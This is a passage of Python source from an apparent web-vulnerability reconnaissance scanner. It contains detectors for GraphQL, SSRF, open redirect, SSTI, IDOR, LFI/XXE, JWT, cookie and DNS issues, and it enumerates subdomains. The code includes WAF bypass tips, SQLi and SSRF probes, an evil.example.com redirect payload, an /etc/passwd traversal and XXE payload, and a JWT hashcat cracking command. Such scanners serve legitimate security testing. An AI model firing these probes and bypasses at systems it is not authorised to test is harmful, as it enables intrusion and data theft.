# ── NEW: WAF Fingerprinting ───────────────────────────────────────────────────
def fingerprint_waf(url: str) -> dict:
    """
    Detect WAF vendor by checking response headers, cookies, and body signatures.
    Also sends a mild SQLi probe to trigger a WAF block page for confirmation.
    Returns: {"vendor": str, "confidence": str, "bypass_tips": list}
    """
    result = {"vendor": None, "confidence": "none", "bypass_tips": []}

    # Passive header check on normal request
    try:
        status, hdrs, body = http_get(url, timeout=8)
        h = norm_headers(hdrs)
        all_header_str = " ".join(f"{k}: {v}" for k,v in h.items()).lower()
        body_text = body[:2000].decode("utf-8","replace").lower()

        for vendor, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in all_header_str or sig.lower() in body_text:
                    result["vendor"] = vendor
                    result["confidence"] = "medium"
                    break
            if result["vendor"]:
                break
    except Exception:
        pass

    # Active probe: send SQLi canary to trigger WAF
    try:
        probe_url = url.rstrip("/") + "/?id=1'%20OR%20'1'='1"
        status2, hdrs2, body2 = http_get(probe_url, timeout=8)
        h2 = norm_headers(hdrs2)
        body2_text = body2[:2000].decode("utf-8","replace").lower()

        if status2 in (403, 406, 429, 503):
            # Confirm vendor from block page
            if "cloudflare" in body2_text or h2.get("cf-ray"):
                result["vendor"] = "Cloudflare"
                result["confidence"] = "high"
            elif "akamai" in body2_text:
                result["vendor"] = "Akamai"
                result["confidence"] = "high"
            elif "imperva" in body2_text or "incapsula" in body2_text:
                result["vendor"] = "Imperva"
                result["confidence"] = "high"
            elif result["vendor"] is None:
                result["vendor"] = "Unknown WAF"
                result["confidence"] = "low"
    except Exception:
        pass

    # Add bypass tips per vendor
    if result["vendor"]:
        tips = {
            "Cloudflare": [
                "Use chunked encoding: Transfer-Encoding: chunked",
                "Try Unicode lookalikes for blocked keywords",
                "HTTP/2 smuggling (CL.0 technique)",
                "X-Forwarded-For: 127.0.0.1 — may bypass IP rules",
            ],
            "Akamai": [
                "Add extra whitespace inside SQL keywords: SE LECT",
                "HTTP parameter pollution: ?id=1&id=2",
                "Try alternate HTTP methods: PUT, PATCH",
            ],
            "Imperva": [
                "Use comment injection: SE/**/LECT",
                "URL-encode payload twice: %2527",
                "Try multipart/form-data for POST payloads",
            ],
        }
        result["bypass_tips"] = tips.get(result["vendor"], [
            "Try Base64 data URI encoding",
            "Use ${IFS} for space in cmd injection",
            "Try tab character (%09) instead of space",
        ])

    return result

# ── NEW: GraphQL full audit ───────────────────────────────────────────────────
def audit_graphql(base_url: str) -> list:
    """
    Test GraphQL endpoints for:
    1. Introspection enabled (info leak)
    2. Batching attack (rate-limit bypass)
    3. Alias amplification
    4. Unauthenticated __typename access
    """
    findings = []
    gql_paths = ["/graphql", "/api/graphql", "/graph", "/graphiql", "/gql", "/query"]

    for path in gql_paths:
        url = base_url.rstrip("/") + path

        # 1. Introspection check
        try:
            status, hdrs, body = http_get(
                url, method="POST",
                headers={"Content-Type": "application/json"},
                body=GRAPHQL_INTROSPECT, timeout=10
            )
            if status == 200:
                text = body.decode("utf-8","replace")
                if '"__schema"' in text or '"types"' in text:
                    # Count exposed types
                    type_count = text.count('"name"')
                    findings.append({
                        "severity": "Medium",
                        "category": "graphql",
                        "title": f"GraphQL introspection enabled at {path}",
                        "url": url,
                        "evidence": f"Schema exposed with ~{type_count} type definitions",
                        "command": f'curl -s -X POST -H "Content-Type: application/json" -d \'{GRAPHQL_INTROSPECT}\' "{url}"',
                        "remediation": "Disable introspection in production: use depthLimit or disableIntrospection()",
                    })

                    # 2. Batching attack test
                    try:
                        st2, _, b2 = http_get(
                            url, method="POST",
                            headers={"Content-Type": "application/json"},
                            body=GRAPHQL_BATCH_TEST, timeout=8
                        )
                        b2_text = b2.decode("utf-8","replace")
                        if st2 == 200 and '"data"' in b2_text and b2_text.count('"data"') >= 2:
                            findings.append({
                                "severity": "Low",
                                "category": "graphql",
                                "title": f"GraphQL batching enabled — rate-limit bypass possible",
                                "url": url,
                                "evidence": "Batch array of 2 queries accepted in one request",
                                "command": f'curl -s -X POST -H "Content-Type: application/json" -d \'{GRAPHQL_BATCH_TEST}\' "{url}"',
                                "remediation": "Disable query batching or enforce per-query rate limiting",
                            })
                    except Exception:
                        pass

                elif '"errors"' in text and '"GRAPHQL_VALIDATION_FAILED"' not in text:
                    findings.append({
                        "severity": "Info",
                        "category": "graphql",
                        "title": f"GraphQL endpoint found at {path} (introspection blocked)",
                        "url": url,
                        "evidence": f"HTTP {status}, introspection returned error",
                        "command": f'curl -s -X POST -H "Content-Type: application/json" -d \'{GRAPHQL_INTROSPECT}\' "{url}"',
                        "remediation": "Confirm introspection is fully disabled in all environments",
                    })
        except Exception:
            pass

    return findings

# ── NEW: SSRF detection ───────────────────────────────────────────────────────
def detect_ssrf_params(base_url: str, ssrf_callback: str = "") -> list:
    """
    Detect SSRF-prone parameters in page source and URL structure.
    If ssrf_callback is provided, inject it as a probe value.
    Otherwise, flag param names statically.
    """
    findings = []

    try:
        status, hdrs, body = http_get(base_url, timeout=10)
        text = body.decode("utf-8","replace")

        # Static: find SSRF param names in forms and links
        found_params = set()
        for param in SSRF_PARAMS:
            # In HTML attributes
            if re.search(rf'(?:name|id)=["\']({re.escape(param)})["\']', text, re.I):
                found_params.add(param)
            # In URL query strings on the page
            if re.search(rf'[?&]{re.escape(param)}=', text, re.I):
                found_params.add(param)

        if found_params:
            findings.append({
                "severity": "Medium",
                "category": "ssrf",
                "title": f"SSRF-prone parameter names found on page: {', '.join(sorted(found_params)[:6])}",
                "url": base_url,
                "evidence": f"Parameters detected: {', '.join(sorted(found_params))}",
                "command": (
                    f'# Test each with OOB callback:\n'
                    f'curl -si "{base_url}?url=https://your.interactsh.com"\n'
                    f'# Cloud metadata targets:\n'
                ) + "\n".join(f"# ?url={v}" for v in list(CLOUD_METADATA_TARGETS.values())[:3]),
                "remediation": "Validate and allowlist URLs; block access to RFC1918 / 169.254.x.x ranges",
            })

        # Active OOB probe (only if callback provided AND active mode enabled).
        # NOTE: dispatching a probe is NOT a finding — it is only evidence once
        # your out-of-band listener records a hit. Reported as Info, never High.
        if ssrf_callback and HTTP_CFG["active"]:
            probed = []
            for param in list(dict.fromkeys(SSRF_PARAMS))[:12]:
                probe_url = f"{base_url}{'&' if '?' in base_url else '?'}{param}={ssrf_callback}"
                try:
                    http_get(probe_url, timeout=5, follow=False)
                    probed.append(param)
                except Exception:
                    pass
            if probed:
                findings.append({
                    "severity": "Info",
                    "category": "ssrf",
                    "title": "SSRF OOB probes dispatched — confirm out-of-band",
                    "url": base_url,
                    "evidence": (f"Injected callback into params: {', '.join(probed)}. "
                                 "This is NOT a vulnerability until your listener records a hit."),
                    "command": "# Watch your interactsh / Burp Collaborator listener for hits from the target",
                    "remediation": "Only report if the callback fires. Restrict server-side fetching; block RFC1918 / 169.254.0.0/16.",
                })

    except Exception:
        pass

    return findings

# ── NEW: Open Redirect detection ──────────────────────────────────────────────
def detect_open_redirects(base_url: str) -> list:
    """
    Probe redirect parameters with an evil.com payload.
    Look for 3xx Location header containing the injected value.
    """
    findings = []
    evil = "https://evil.example.com"
    evil_encoded = "https%3A%2F%2Fevil.example.com"

    try:
        status, hdrs, body = http_get(base_url, timeout=10)
        text = body.decode("utf-8","replace")

        found_params = set()
        for param in REDIRECT_PARAMS:
            if re.search(rf'[?&]{re.escape(param)}=', text, re.I) or \
               re.search(rf'name=["\']({re.escape(param)})["\']', text, re.I):
                found_params.add(param)
    except Exception:
        return findings

    for param in list(found_params)[:6]:
        for payload in [evil, f"//{urlparse(evil).netloc}", evil_encoded]:
            probe = f"{base_url}{'&' if '?' in base_url else '?'}{param}={payload}"
            try:
                st, h, b = http_get(probe, follow=False, timeout=6)
                h = norm_headers(h)
                loc = h.get("location","")
                if st in (301,302,303,307,308) and ("evil" in loc or "evil" in b[:500].decode("utf-8","replace")):
                    findings.append({
                        "severity": "Medium",
                        "category": "open-redirect",
                        "title": f"Open Redirect via parameter '{param}'",
                        "url": probe,
                        "evidence": f"HTTP {st} → Location: {loc[:80]}",
                        "command": f'curl -si -o /dev/null -w "%{{http_code}} %{{redirect_url}}" "{probe}"',
                        "remediation": "Validate redirect targets against an allowlist; use relative paths only",
                    })
                    break
            except Exception:
                pass

    # Also flag static parameter names as candidates
    if found_params and not findings:
        findings.append({
            "severity": "Low",
            "category": "open-redirect",
            "title": f"Redirect parameter names present — test manually: {', '.join(sorted(found_params)[:5])}",
            "url": base_url,
            "evidence": f"Parameters found in page source: {', '.join(sorted(found_params))}",
            "command": "\n".join([f'curl -si -o /dev/null -w "%{{http_code}} %{{redirect_url}}" "{base_url}?{p}=https://evil.example.com"' for p in list(found_params)[:3]]),
            "remediation": "Test each with a payload like https://evil.com and inspect the Location header",
        })

    return findings

# ── NEW: SSTI canary detection ────────────────────────────────────────────────
def detect_ssti(base_url: str) -> list:
    """Differential SSTI probe — no fixed '49' (that false-positives constantly).

    For each param we pick a RANDOM product a*b, then require three things before
    we believe it: (1) the product value appears in the injected response,
    (2) it is NOT present in a benign baseline response, and (3) neither the raw
    payload nor the literal 'a*b' arithmetic is merely reflected. Only a genuinely
    *evaluated* expression passes all three."""
    findings = []
    sep = "&" if "?" in base_url else "?"
    try:
        status, hdrs, body = http_get(base_url, timeout=10)
        text = body.decode("utf-8", "replace")
        param_names = set(m.group(1) for m in re.finditer(r'[?&]([a-zA-Z0-9_\-]{2,20})=', text))
        if not param_names:
            return findings

        engines = [("{{%d*%d}}", "Jinja2/Twig"), ("${%d*%d}", "Freemarker/Velocity/Spring"),
                   ("<%%= %d*%d %%>", "ERB (Ruby)"), ("#{%d*%d}", "Ruby/Slim")]

        for param in list(param_names)[:5]:
            a, b = random.randint(211, 499), random.randint(211, 499)
            product, arith = str(a * b), f"{a}*{b}"
            marker = "zz" + "".join(random.choices(string.ascii_lowercase, k=6)) + "zz"
            # baseline — benign value; if the product already appears here, bail (coincidence)
            try:
                _, _, bb = http_get(f"{base_url}{sep}{param}={marker}", timeout=6)
                baseline = bb.decode("utf-8", "replace")
            except Exception:
                baseline = ""
            if product in baseline:
                continue

            for tmpl, engine in engines:
                payload = tmpl % (a, b)
                probe = f"{base_url}{sep}{param}={quote(payload)}"
                try:
                    _, _, pb = http_get(probe, timeout=6)
                    rt = pb.decode("utf-8", "replace")
                except Exception:
                    continue
                evaluated = (product in rt) and (payload not in rt) and (arith not in rt)
                if evaluated:
                    findings.append({
                        "severity": "High", "category": "ssti",
                        "title": f"SSTI in parameter '{param}' ({engine})",
                        "url": probe,
                        "evidence": (f"{param}={payload} → response contains the computed product "
                                     f"'{product}' while the literal payload and raw '{arith}' are "
                                     f"absent (expression was evaluated, not reflected)."),
                        "command": f'curl -s "{probe}"',
                        "remediation": "Never render user input through a template engine; sandbox or "
                                       "pre-escape. Confirm/escalate with tplmap or SSTImap.",
                    })
                    break
    except Exception:
        pass
    return findings

# ── NEW: Prototype Pollution detection ────────────────────────────────────────
def detect_prototype_pollution(base_url: str) -> list:
    """
    Test query params for client-side prototype pollution via
    __proto__[testprop]=1 and constructor[prototype][testprop]=1.
    Looks for property reflection in JSON responses.
    """
    findings = []
    payloads = [
        ("__proto__[bountytest]", "1"),
        ("constructor[prototype][bountytest]", "1"),
        ("__proto__.bountytest", "1"),
    ]

    for key, val in payloads:
        probe = f"{base_url}{'&' if '?' in base_url else '?'}{key}={val}"
        try:
            st, h, b = http_get(probe, timeout=8)
            h = norm_headers(h)
            ct = h.get("content-type","")
            response_text = b.decode("utf-8","replace")

            # Look for reflection in JSON response
            if "application/json" in ct and "bountytest" in response_text:
                findings.append({
                    "severity": "High",
                    "category": "prototype-pollution",
                    "title": f"Prototype Pollution — server-side reflection via '{key}'",
                    "url": probe,
                    "evidence": f"'bountytest' key reflected in JSON response",
                    "command": f'curl -s "{probe}"',
                    "remediation": "Sanitize query parameter keys; use Object.freeze(Object.prototype); implement schema validation",
                })
                return findings

        except Exception:
            pass

    # Static check: does the page load client-side JS frameworks known to be vulnerable?
    try:
        _, _, body = http_get(base_url, timeout=8)
        text = body.decode("utf-8","replace")
        if any(lib in text for lib in ["lodash", "jquery", "prototype.js", "mootools"]):
            findings.append({
                "severity": "Low",
                "category": "prototype-pollution",
                "title": "Prototype Pollution candidate — JavaScript libraries detected",
                "url": base_url,
                "evidence": "Client-side library (lodash/jQuery/MooTools) detected — test manually in browser devtools",
                "command": "# In browser console:\n# Object.prototype.bountytest = 1; visit ?__proto__[bountytest]=1; check Object.prototype.bountytest",
                "remediation": "Update lodash ≥ 4.17.21 and jQuery ≥ 3.5.0; validate input keys server-side",
            })
    except Exception:
        pass

    return findings

# ── NEW: Race condition endpoint detection ────────────────────────────────────
def detect_race_candidates(base_url: str) -> list:
    """
    Detect endpoints that are common race condition targets:
    coupon redemption, transfers, referrals, votes, stock purchase.
    """
    findings = []
    race_keywords = [
        "coupon","redeem","voucher","discount","credit","transfer","send",
        "withdraw","referral","bonus","reward","vote","like","apply","claim",
        "checkout","purchase","order","buy","stock","limit","use","spend",
    ]

    try:
        _, _, body = http_get(base_url, timeout=10)
        text = body.decode("utf-8","replace").lower()
        found = set()

        # Look in URLs and form actions
        for m in re.finditer(r'(?:href|action|src)=["\']([^"\']+)["\']', text, re.I):
            href = m.group(1).lower()
            for kw in race_keywords:
                if kw in href:
                    found.add((kw, m.group(1)[:80]))
                    break

        if found:
            examples = [f"{kw}: {url}" for kw, url in list(found)[:5]]
            findings.append({
                "severity": "Low",
                "category": "race-condition",
                "title": f"Race condition candidates: {', '.join(set(kw for kw,_ in found))}",
                "url": base_url,
                "evidence": "\n".join(examples),
                "command": (
                    "# Test with Burp Suite: Send to Repeater → 'Send group in parallel'\n"
                    "# Or with turbo-intruder:\n"
                    "# python turbo-intruder.py -u TARGET -s race.py -w wordlist.txt"
                ),
                "remediation": "Implement idempotency tokens; use DB-level locks (SELECT FOR UPDATE); validate at atomic transaction level",
            })
    except Exception:
        pass

    return findings

# ── NEW: IDOR candidate detector ─────────────────────────────────────────────
def detect_idor_candidates(base_url: str) -> list:
    """
    Scan API responses for numeric IDs and UUIDs that may be testable for IDOR.
    Also checks for user/account/order/invoice identifiers in HTML.
    """
    findings = []
    idor_paths = ["/api/v1/users", "/api/v1/orders", "/api/v1/invoices",
                  "/api/users", "/api/orders", "/api/me", "/api/account",
                  "/api/v2/users", "/api/v2/orders"]

    uuid_re   = re.compile(r'"(?:id|user_id|account_id|order_id|invoice_id|doc_id)"\s*:\s*"?([0-9a-f-]{6,})"?', re.I)
    num_id_re = re.compile(r'"(?:id|user_id|account_id|order_id)"\s*:\s*(\d{3,})')

    for path in idor_paths:
        url = base_url.rstrip("/") + path
        try:
            st, h, b = http_get(url, timeout=8)
            h = norm_headers(h)
            if st in (200, 201):
                text = b.decode("utf-8","replace")
                uuids   = uuid_re.findall(text)
                num_ids = num_id_re.findall(text)

                if uuids or num_ids:
                    sample_ids = (uuids + num_ids)[:3]
                    findings.append({
                        "severity": "Medium",
                        "category": "idor",
                        "title": f"IDOR candidates — object IDs exposed at {path}",
                        "url": url,
                        "evidence": f"IDs found: {', '.join(str(x) for x in sample_ids)} (use Account B to access Account A resources)",
                        "command": (
                            f'# With Account B credentials, try:\n'
                            f'curl -si -H "Authorization: Bearer <TOKEN_B>" "{url}/{sample_ids[0] if sample_ids else "ID"}"'
                        ),
                        "remediation": "Use UUIDs instead of sequential IDs; implement object-level auth checks (OWASP API1)",
                    })
                    break
        except Exception:
            pass

    # Also check main page for IDs in HTML
    try:
        _, _, body = http_get(base_url, timeout=8)
        text = body.decode("utf-8","replace")
        ids_in_html = re.findall(r'(?:data-id|data-user-id|data-account-id)=["\'](\d{3,})["\']', text, re.I)
        if ids_in_html:
            findings.append({
                "severity": "Low",
                "category": "idor",
                "title": f"Object IDs exposed in HTML attributes",
                "url": base_url,
                "evidence": f"Found {len(ids_in_html)} numeric IDs in HTML: e.g. {ids_in_html[0]}",
                "command": f'curl -si "{base_url}" | grep -Eo "data-id=[0-9]+"',
                "remediation": "Avoid exposing internal numeric IDs in HTML; use opaque tokens",
            })
    except Exception:
        pass

    return findings

# ── NEW: LFI / XXE surface detection ─────────────────────────────────────────
def detect_lfi_xxe_surface(base_url: str) -> list:
    """
    Detect LFI-prone parameter names and XXE-vulnerable file upload surfaces.
    """
    findings = []

    try:
        _, _, body = http_get(base_url, timeout=10)
        text = body.decode("utf-8","replace")

        # LFI param names
        lfi_found = set()
        for param in LFI_PARAMS:
            if re.search(rf'[?&]{re.escape(param)}=', text, re.I) or \
               re.search(rf'name=["\']({re.escape(param)})["\']', text, re.I):
                lfi_found.add(param)

        if lfi_found:
            findings.append({
                "severity": "Medium",
                "category": "lfi",
                "title": f"LFI/path traversal parameter candidates: {', '.join(sorted(lfi_found)[:6])}",
                "url": base_url,
                "evidence": f"Parameter names: {', '.join(sorted(lfi_found))}",
                "command": (
                    "# Test traversal sequences:\n" +
                    "\n".join([f'curl -si "{base_url}?{p}=../../../../etc/passwd"' for p in list(lfi_found)[:3]])
                ),
                "remediation": "Validate and whitelist file paths; use basename() to strip directory traversal",
            })

        # XXE upload surfaces: forms with file upload accepting XML/SVG/DOCX
        upload_forms = re.findall(
            r'<input[^>]+type=["\']file["\'][^>]*>',
            text, re.I
        )
        for form in upload_forms:
            accepts = re.search(r'accept=["\']([^"\']+)["\']', form, re.I)
            accept_val = accepts.group(1).lower() if accepts else ""
            if any(x in accept_val for x in ["xml","svg","docx","xlsx","word","spreadsheet"]) \
               or "accept" not in form.lower():
                findings.append({
                    "severity": "Medium",
                    "category": "xxe",
                    "title": "File upload surface — potential XXE via XML/SVG/DOCX",
                    "url": base_url,
                    "evidence": f"Upload field: {form[:100]}",
                    "command": (
                        "# Upload SVG with XXE payload:\n"
                        '# <?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                        '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
                    ),
                    "remediation": "Disable XML external entities (XXE) in parser config; validate file MIME type server-side",
                })
            break  # one finding per page is enough

    except Exception:
        pass

    return findings

# ── NEW: Wayback canary parameter extraction ──────────────────────────────────
def fetch_wayback_params(domain: str, limit: int = 200) -> list:
    """
    Fetch parameterised URLs from Wayback Machine CDX API.
    Returns deduplicated list of parameter names seen historically.
    """
    urls_with_params = []
    try:
        cdx_url = (
            f"http://web.archive.org/cdx/search/cdx"
            f"?url={domain}/*&output=text&fl=original&filter=statuscode:200"
            f"&filter=original:.*%3F.*&limit={limit}&collapse=urlkey"
        )
        st, _, b = http_get(cdx_url, timeout=20)
        if st == 200:
            for line in b.decode("utf-8","replace").splitlines():
                line = line.strip()
                if "?" in line:
                    urls_with_params.append(line)
    except Exception:
        pass
    return urls_with_params

def mine_parameters(urls: list) -> list:
    """Extract unique parameter names from a list of URLs."""
    params = set()
    for url in urls:
        try:
            parsed = urlparse(url)
            if parsed.query:
                for key in parse_qs(parsed.query).keys():
                    if 2 <= len(key) <= 30 and re.match(r'^[a-zA-Z0-9_\-]+$', key):
                        params.add(key)
        except Exception:
            pass
    return sorted(params)

# ── NEW: IDN homoglyph domain check ──────────────────────────────────────────
def check_idn_homoglyphs(domain: str) -> list:
    """
    Check for common IDN lookalike domains that could be used for phishing.
    Tests a small set of high-risk substitutions.
    """
    findings = []
    base = domain.split(".")[0]
    tld  = ".".join(domain.split(".")[1:])

    subs = {
        'o': ['0', 'ο', 'о'],  # ASCII 0, Greek omicron, Cyrillic o
        'a': ['а', 'ą'],
        'e': ['е', 'ё'],
        'i': ['1', 'і', 'ı'],
        'l': ['1', 'I'],
        'c': ['с'],
    }

    candidates = set()
    for i, char in enumerate(base.lower()):
        if char in subs:
            for rep in subs[char][:1]:  # limit to 1 per char to avoid explosion
                candidate = base[:i] + rep + base[i+1:]
                candidates.add(f"{candidate}.{tld}")

    registered = []
    for candidate in list(candidates)[:8]:
        try:
            socket.gethostbyname(candidate)
            registered.append(candidate)
        except socket.gaierror:
            pass  # not registered

    if registered:
        findings.append({
            "severity": "Medium",
            "category": "idn-homoglyph",
            "title": f"IDN lookalike domain(s) registered: {', '.join(registered)}",
            "url": f"https://{domain}",
            "evidence": f"Domains resolve: {', '.join(registered)}",
            "command": "\n".join([f"dig +short A {d}" for d in registered]),
            "remediation": "Register lookalike domains defensively; monitor brand domains via cert transparency logs",
        })

    return findings

# ── v2.5 preserved helpers ────────────────────────────────────────────────────
def audit_jwt_token(token: str, source_url: str) -> list:
    findings = []
    parts = token.strip().split(".")
    if len(parts) < 2: return findings
    try:
        hdr_b64 = parts[0] + "=" * (-len(parts[0]) % 4)
        header  = json.loads(base64.urlsafe_b64decode(hdr_b64).decode("utf-8","replace"))
        payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_b64).decode("utf-8","replace"))
        alg = str(header.get("alg","")).lower()
        if alg == "none":
            findings.append({"severity":"Critical","category":"jwt","type":"jwt",
                "title":"JWT alg:none — signature bypass",
                "url":source_url,"detail":"alg:none accepted","command":f'# Strip signature from JWT and set alg to none',"remediation":"Reject alg:none JWTs"})
        elif alg.startswith("hs"):
            findings.append({"severity":"Info","category":"jwt","type":"jwt",
                "title":f"JWT uses symmetric HMAC ({alg.upper()})",
                "url":source_url,"detail":f"Header: {json.dumps(header)}","command":"hashcat -a 0 -m 16500 <jwt> rockyou.txt","remediation":"Prefer RS256/ES256"})
        sensitive_keys = [k for k in payload.keys() if any(w in k.lower() for w in ["pass","secret","priv","email","role","admin"])]
        if sensitive_keys:
            findings.append({"severity":"Low","category":"jwt","type":"jwt",
                "title":f"JWT exposes sensitive claims: {', '.join(sensitive_keys[:4])}",
                "url":source_url,"detail":f"Claims: {', '.join(sensitive_keys)}","command":"","remediation":"Don't store secrets in JWT payload"})
    except Exception: pass
    return findings

def audit_cookie(name: str, value: str, raw_cookie_str: str, base_url: str) -> list:
    findings = []
    parts  = [p.strip() for p in raw_cookie_str.split(";")]
    attrs  = {p.split("=")[0].lower(): (p.split("=")[1] if "=" in p else True) for p in parts}
    is_session = any(k in name.lower() for k in ["sess","auth","token","jwt","id","login","user","csrf"])
    if "secure" not in attrs and base_url.startswith("https:"):
        findings.append({"severity":"Medium" if is_session else "Low","category":"cookies",
            "title":f"Cookie '{name}' lacks Secure flag","url":base_url,"evidence":raw_cookie_str[:120],
            "command":f'curl -si "{base_url}" | grep -i "Set-Cookie"',"remediation":"Add Secure attribute"})
    if is_session and "httponly" not in attrs:
        findings.append({"severity":"Medium","category":"cookies",
            "title":f"Cookie '{name}' lacks HttpOnly flag (XSS risk)","url":base_url,"evidence":raw_cookie_str[:120],
            "command":f'curl -si "{base_url}" | grep -i "Set-Cookie"',"remediation":"Add HttpOnly attribute"})
    if "samesite" not in attrs:
        findings.append({"severity":"Low","category":"cookies",
            "title":f"Cookie '{name}' lacks SameSite attribute","url":base_url,"evidence":raw_cookie_str[:120],
            "command":f'curl -si "{base_url}" | grep -i "Set-Cookie"',"remediation":"Set SameSite=Lax or Strict"})
    return findings

def audit_dns_security(domain: str) -> list:
    findings = []
    if not HAS_DNS: return findings
    txt_records, dmarc_records, caa_records = [], [], []
    try:
        for r in dns.resolver.resolve(domain,"TXT"): txt_records.append(str(r).strip('"'))
    except Exception: pass
    try:
        for r in dns.resolver.resolve(f"_dmarc.{domain}","TXT"): dmarc_records.append(str(r).strip('"'))
    except Exception: pass
    try:
        for r in dns.resolver.resolve(domain,"CAA"): caa_records.append(str(r))
    except Exception: pass
    spf = [t for t in txt_records if "v=spf1" in t]
    if not spf:
        findings.append({"severity":"Low","category":"dns-sec","title":f"DNS: Missing SPF record on {domain}","url":f"dns://{domain}","evidence":"No SPF found","command":f"dig +short TXT {domain}","remediation":"Publish SPF TXT record"})
    elif "+all" in spf[0]:
        findings.append({"severity":"Medium","category":"dns-sec","title":"DNS: Insecure SPF +all allows any sender","url":f"dns://{domain}","evidence":spf[0],"command":f"dig +short TXT {domain}","remediation":"Change to -all"})
    if not dmarc_records:
        findings.append({"severity":"Low","category":"dns-sec","title":f"DNS: Missing DMARC record","url":f"dns://_dmarc.{domain}","evidence":"No DMARC found","command":f"dig +short TXT _dmarc.{domain}","remediation":"Publish DMARC record"})
    else:
        dm = dmarc_records[0]
        if "p=none" in dm:
            findings.append({"severity":"Info","category":"dns-sec","title":"DNS: DMARC p=none (monitor only)","url":f"dns://_dmarc.{domain}","evidence":dm,"command":f"dig +short TXT _dmarc.{domain}","remediation":"Advance to p=quarantine or p=reject"})
    if not caa_records:
        findings.append({"severity":"Info","category":"dns-sec","title":f"DNS: CAA record not configured","url":f"dns://{domain}","evidence":"No CAA records","command":f"dig +short CAA {domain}","remediation":"Configure CAA records"})
    return findings

def deep_fingerprint_tech(url: str, hdrs: dict, html_text: str = "") -> list:
    h = norm_headers(hdrs)
    tech = set()
    if h.get("server"): tech.add(f"Server: {h.get('server')}")
    if h.get("cf-ray") or h.get("server","") == "cloudflare": tech.add("Cloudflare CDN & WAF")
    if h.get("x-vercel-id"): tech.add("Vercel Edge Platform")
    if h.get("x-amz-request-id"): tech.add("AWS")
    if h.get("x-powered-by"): tech.add(f"Powered-By: {h.get('x-powered-by')}")
    if html_text:
        if "__NEXT_DATA__" in html_text or "/_next/" in html_text:
            m = re.search(r'content=["\']Next\.js\s*([0-9\.]+)["\']', html_text)
            tech.add(f"Next.js{' v'+m.group(1) if m else ''}")
        elif "react" in html_text.lower() or "data-reactroot" in html_text: tech.add("React.js")
        if "vue" in html_text.lower() and "__vue" in html_text: tech.add("Vue.js")
        if "angular" in html_text.lower() and "ng-" in html_text: tech.add("Angular")
        if "tailwind" in html_text.lower() or "items-center" in html_text: tech.add("Tailwind CSS")
        if "authjs" in html_text.lower() or "__host-authjs" in str(hdrs).lower(): tech.add("Auth.js")
        if "sentry" in html_text.lower(): tech.add("Sentry")
        if "google-analytics.com" in html_text or "googletagmanager.com" in html_text: tech.add("Google Analytics/GTM")
        if "stripe.com/v3" in html_text: tech.add("Stripe Payments")
        if "intercom" in html_text.lower(): tech.add("Intercom")
    return sorted(list(tech))

OAUTH_REDIRECT_PATTERN = re.compile(r"""(?:['"])([^"'\s]*(?:callbackUrl|redirect_uri|redirect_url|return_to|next|returnTo)[^"'\s]*|/api/auth/callback/[a-zA-Z0-9_\-]+|[a-zA-Z0-9_\-]+\.apps\.googleusercontent\.com)(?:['"])""")
API_ENDPOINT_PATTERN  = re.compile(r'["\'](/(?:api|v[0-9]|rest|graphql|admin|auth|oauth|user|webhook|settings|config)[a-zA-Z0-9_\-/\.]+[\?a-zA-Z0-9_\-=&]*)["\']')

def extract_oauth_and_redirects(js_text: str) -> list:
    results = set()
    for m in OAUTH_REDIRECT_PATTERN.finditer(js_text):
        for g in m.groups():
            if g and len(g) > 4: results.add(g.strip())
    return sorted(list(results))

def extract_endpoints_from_js(text: str) -> list:
    endpoints = set()
    for m in API_ENDPOINT_PATTERN.finditer(text):
        path = m.group(1).strip()
        if len(path) > 4 and not path.endswith(".js") and not path.endswith(".css"): endpoints.add(path)
    return sorted(endpoints)

def extract_nextjs_routes_and_chunks(base_url: str, html_text: str) -> tuple:
    routes, chunks = set(), set()
    try:
        manifest_url = None
        build_id_m = re.search(r'"buildId"\s*:\s*"([a-zA-Z0-9_\-]+)"', html_text)
        if build_id_m:
            bid = build_id_m.group(1)
            manifest_url = f"{base_url.rstrip('/')}/_next/static/{bid}/_buildManifest.js"
        else:
            m = re.search(r'src=["\']([^"\']+/_buildManifest\.js[^"\']*)["\']', html_text)
            if m: manifest_url = urljoin(base_url, m.group(1))
        if manifest_url:
            status, _, body = http_get(manifest_url, timeout=8)
            if status == 200:
                m_text = body.decode("utf-8","replace")
                for r in re.findall(r'["\'](/[^"\']*)["\']\s*:\s*\[', m_text):
                    if not r.startswith("/_"): routes.add(r)
                for c in re.findall(r'["\'](static/chunks/[^"\']+\.js)["\']', m_text):
                    chunks.add(f"{base_url.rstrip('/')}/_next/{c}")
    except Exception: pass
    return sorted(routes), sorted(chunks)

def enum_subdomains_crtsh(domain: str) -> set:
    subs = set()
    try:
        status, _, body = http_get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=20)
        if status == 200:
            for entry in json.loads(body):
                for n in entry.get("name_value","").split("\n"):
                    n = n.strip().lstrip("*.")
                    if n.endswith(f".{domain}") or n == domain: subs.add(n.lower())
    except Exception: pass
    return subs

def enum_subdomains_hackertarget(domain: str) -> set:
    subs = set()
    try:
        status, _, body = http_get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=10)
        if status == 200:
            for line in body.decode("utf-8","replace").splitlines():
                if "," in line:
                    host = line.split(",")[0].strip().lower()
                    if host.endswith(f".{domain}") or host == domain: subs.add(host)
    except Exception: pass
    return subs

def enum_subdomains_alienvault(domain: str) -> set:
    subs = set()
    try:
        status, _, body = http_get(f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns", timeout=12)
        if status == 200:
            for entry in json.loads(body).get("passive_dns",[]):
                h = entry.get("hostname","").strip().lower()
                if h.endswith(f".{domain}") or h == domain: subs.add(h)
    except Exception: pass
    return subs

def enum_subdomains_anubis(domain: str) -> set:
    subs = set()
    try:
        status, _, body = http_get(f"https://jldc.me/anubis/subdomains/{domain}", timeout=10)
        if status == 200:
            for s in json.loads(body):
                s = s.strip().lower()
                if s.endswith(f".{domain}") or s == domain: subs.add(s)
    except Exception: pass
    return subs

def enum_subdomains_rapiddns(domain: str) -> set:
    subs = set()
    try:
        status, _, body = http_get(f"https://rapiddns.io/subdomain/{domain}?full=1", timeout=12)
        if status == 200:
            for m in re.finditer(rf'<td>([a-zA-Z0-9_\-\.]+\.{re.escape(domain)})</td>', body.decode("utf-8","replace")):
                subs.add(m.group(1).lower())
    except Exception: pass
